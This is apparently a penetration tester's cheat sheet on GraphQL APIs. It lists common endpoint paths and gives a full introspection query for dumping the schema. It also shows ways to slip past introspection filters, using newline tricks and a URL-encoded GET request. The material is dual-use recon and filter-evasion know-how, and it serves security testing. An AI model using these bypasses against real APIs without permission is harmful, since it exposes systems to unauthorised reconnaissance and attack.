# Content
- [Common endpoint names](#common-endpoint-names)
- [Discovering schema information](#discovering-schema-information)
- [Bypassing GraphQL introspection defenses]()

## Common endpoint names 
- /graphql
- /api
- /api/graphql
- /graphql/api
- /graphql/graphql
also try appending /v1 to the path.

## Exploiting unsanitized arguments 
check for  Broken access control vulnerabilities or IDOR

## Discovering schema information 

### using Introspection
get names of all available queries. 
```graphql
    {
        "query": "{__schema{queryType{name}}}"
    }
```
get full scheme
```graphql
 query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```
### using Suggestions
this tool [Clairvoyance](https://github.com/nikitastupin/clairvoyance) can get the scheme info using suggestions 


## Bypassing GraphQL introspection defenses
- **manpulate the query**
You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.


for example if `__schema{` is ignored , try
```graphql

    {
        "query": "query{__schema
        {queryType{name}}}"
    }

```

- **change request method or type**

```http
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```
